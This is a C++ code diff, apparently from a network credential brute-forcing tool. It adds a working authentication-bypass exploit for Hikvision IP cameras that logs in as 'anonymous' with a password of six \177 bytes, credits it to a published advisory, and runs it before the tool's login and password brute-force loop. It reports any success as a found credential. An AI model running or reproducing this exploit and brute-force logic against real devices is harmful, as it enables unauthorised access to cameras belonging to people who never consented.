@@ -30,12 +30,34 @@ bool BA::checkOutput(const string *buffer, const char *ip, const int port) {
     return false;
 }
 
+//http://www.coresecurity.com/advisories/hikvision-ip-cameras-multiple-vulnerabilities 2
+inline bool commenceHikvisionEx1(const char *ip, const int port, bool digestMode) {
+	std::string lpString = string("anonymous") + ":" + string("\177\177\177\177\177\177");
+
+	string buffer;
+	int res = Connector::nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
+	if (res == -2) return -1;
+	else if (res != -1) {
+		if (BA::checkOutput(&buffer, ip, port)) return 1;
+	}
+	return 0;
+}
+
 lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
     string buffer;
     string lpString;
     lopaStr lps = {"UNKNOWN", "", ""};
     int passCounter = 0;
 	int res = 0;
+
+	if (commenceHikvisionEx1(ip, port, digestMode)) {
+		stt->doEmitionGreenFoundData("Hikvision exploit triggered! (" + 
+			QString(ip) + ":" + 
+			QString::number(port) + ")");
+		strcpy(lps.login, "anonymous");
+		strcpy(lps.pass, "\177\177\177\177\177\177");
+		return lps;
+	}
 
     for(int i = 0; i < MaxLogin; ++i) {
         for (int j = 0; j < MaxPass; ++j) {
